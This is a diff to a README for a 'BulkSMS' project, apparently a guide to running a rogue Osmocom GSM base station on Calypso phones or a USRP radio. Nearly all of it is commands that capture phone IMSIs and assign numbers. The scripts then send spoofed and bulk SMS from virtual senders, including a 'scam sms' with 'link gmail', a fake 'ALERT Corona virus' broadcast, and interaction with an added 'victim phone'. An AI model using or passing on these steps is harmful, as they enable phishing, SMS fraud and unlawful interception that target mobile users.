@@ -1145,22 +1145,317 @@ Plug usb ttl for motorola phone
 ```
 dmesg | grep ttyUSB*
 ```
-## Adding devices USRP on LXC
-* For on Phone (SMS only)
+## Adding devices USRP on LXC for Quick install
 ```
-lxc config device add KarliBTS ttyUSB0 unix-char path=/dev/ttyUSB0
+lxc config device add BulkSMS ttyUSB0 unix-char path=/dev/ttyUSB0
 ```  
-* For two Phones (SMS and Call)
+
+## Setting privileges for Quick install
 ```
-lxc config device add KarliBTS ttyUSB0 unix-char path=/dev/ttyUSB0
-```
-```
-lxc config device add KarliBTS ttyUSB1 unix-char path=/dev/ttyUSB1
-```
-## Setting privileges
-```
-lxc config set KarliBTS security.privileged=true
+lxc config set BulkSMS security.privileged=true
 ```
 
 
+## launching for Quick install
+```
+lxc exec BulkSMS -- bash
+```
+```
+exit
+```
 
+## REMOVING DEVICES ON LXC for Quick install
+```
+lxc config device remove BulkSMS ttyUSB0 
+```
+
+## CONFIGURING SCRIPT for Quick install
+```
+lxc exec BulkSMS -- bash
+```
+```
+cd osmo-nitb-scripts-calypsobts
+```
+Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
+Installing network signal guru on your android phone  
+And finding the arfcn that this one is connect  
+Let's name this arfcn as 975  
+Configure arfcn at service/osmotrx.lms as 975
+```
+nano services/osmo-trx-lms3.service 
+```
+Save the configuration using ctrl+x
+```
+cd osmo-nitb-scripts-calypsobts
+```
+```
+bash install_services.sh 
+```
+For avoiding lock database error 
+```
+fuser -k /usr/src/CalypsoBTS/hlr.sqlite3
+```
+```
+cd ..
+```
+
+## Plug usb ttl for Quick install
+```
+lxc config device add BulkSMS ttyUSB0 unix-char path=/dev/ttyUSB0
+```
+```
+lxc config set BulkSMS security.privileged=true
+```
+
+## Testing TRX CALYPSO for Quick install
+on Terminal
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts-calypsobts/trx.sh
+```
+Click button power of motorola phone  
+
+## Testing CALYPSO SpoofScript1 for Quick install
+Tape ctrl+shift+T
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts-calypsobts/main_spoof.py
+```
+ctrl+shift+T
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts-calypsobts/scripts_spoof1/finding_imsi_extenstion.sh
+```
+You could find imsi and extension  
+let's see for example imsi as 646040222463674 and extension as 126
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts-calypsobts/scripts_spoof1/set_imsi_extension.sh 646040222463674 0341220590
+```
+Verify by if the association is correct
+let's see for example imsi as 646040222463674 and extension as 0341220590
+```
+bash finding_imsi_extenstion.sh
+```
+Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
+Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
+Tape `*#001#` for finding your phone number (extension with osmo-bts)   
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof1/sending_sms_spoof_byextension.py
+```
+Sending for all extensions in osmo-bts
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof1/sending_sms_broadcast.py 
+```
+log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  
+
+## Testing CALYPSO SpoofScript2 for Quick install
+ctrl+shift+T
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py 
+```
+You could find imsi and extension
+Create a virtual extension 0341220590 and send sms to existing extension eg : 164
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/sms_send_source_dest_msg.py 0341220590 164 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py 
+```
+Creating many extensions for sending a scam sms repeat 3 times
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/sms_spam.py 164 3 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py 
+```
+Sending a broadcast sms by using a virtual number as extension 165
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/sms_broadcast.py 165 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts-calypsobts/scripts_spoof2/show_subscribers.py
+```
+## Testing CALYPSO FakeSMS Sender for Quick install
+Configuring config.json
+Configuring trx calypso
+```
+lxc exec BulkSMS -- bash
+```
+```
+cd osmo-nitb-scripts-calypsobts
+```
+Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
+Installing network signal guru on your android phone  
+And finding the arfcn that this one is connect  
+Let's name this arfcn as 975  
+Configure arfcn at service/osmotrx.lms as 975
+```
+nano services/osmo-trx-lms3.service 
+```
+ctrl+x and tape yes
+```
+exit
+```
+```
+lxc exec BulkSMS -- bash
+```
+```
+cd osmo-nitb-scripts-calypsobts
+```
+```
+bash install_services.sh 
+```
+For avoiding lock database error 
+```
+fuser -k /usr/src/CalypsoBTS/hlr.sqlite3
+```
+```
+exit
+```
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts-calypsobts/trx.sh
+```
+Tape ctrl+shift+T
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts-calypsobts/main.py
+```
+Add victim phone and tape Tape ctrl+shift+T
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts-calypsobts/interact.py
+```
+
+
+## Testing TRX UHD (USRP) for Quick install
+```
+wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/fork_QCSuperLXD/main/lxd-device
+```
+```
+chmod +x lxd-device
+```
+```
+sudo cp lxd-device /usr/local/bin
+```
+```
+lxd-device add BulkSMS usrp
+```
+Plug usrp devices
+```
+lxc exec BulkSMS -- uhd_images_downloader
+```
+```
+lxc exec BulkSMS --  uhd_usrp_probe 
+```
+```
+lxc exec BulkSMS -- uhd_find_devices 
+```
+```
+lxc exec BulkSMS -- bash
+```
+```
+cd osmo-nitb-scripts
+```
+```
+bash install_services.sh 
+```
+```
+lxc exec BulkSMS -- bash 
+```
+```
+osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
+```
+Tape ctrl+shift+T
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts/main_uhd_spoof.py
+```
+
+## Testing USRP SpoofScript1
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
+```
+You could find imsi and extension  
+let's see for example imsi as 646040222463674 and extension as 126
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts/scripts_spoof1/set_imsi_extension.sh 646040222463674 0341220590
+```
+Verify by if the association is correct
+let's see for example imsi as 646040222463674 and extension as 0341220590
+```
+lxc exec BulkSMS -- bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
+```
+Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
+Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
+Tape `*#001#` for finding your phone number (extension with osmo-bts)   
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_spoof_byextension.py
+```
+Sending for all extensions in osmo-bts
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof1/sending_sms_broadcast.py 
+```
+log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  
+
+## Testing USRP SpoofScript2
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
+```
+You could find imsi and extension
+Create a virtual extension 0341220590 and send sms to existing extension eg : 164
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/sms_send_source_dest_msg.py 0341220590 164 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
+```
+Creating many extensions for sending a scam sms repeat 3 times
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/sms_spam.py 164 3 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
+```
+Sending a broadcast sms by using a virtual number as extension 165
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/sms_broadcast.py 165 "link gmail"
+```
+You could find imsi and extension
+```
+lxc exec BulkSMS -- python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py
+```
+```
+exit
+```
+
+## Testing USRP Fake SMS Sender for Quick install
+Configure config.json
+Configuring trx uhd
+```
+lxc exec BulkSMS -- bash 
+```
+```
+cd osmo-nitb-scripts
+```
+```
+bash install_services.sh 
+```
+```
+exit
+```
+```
+lxc exec BulkSMS -- bash 
+```
+```
+osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
+```
+Tape ctrl+shift+T
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts/main_uhd.py
+```
+Add victim phone and tape Tape ctrl+shift+T
+```
+lxc exec BulkSMS -- python3 osmo-nitb-scripts-calypsobts/interact.py
+```
+```
+exit
+```
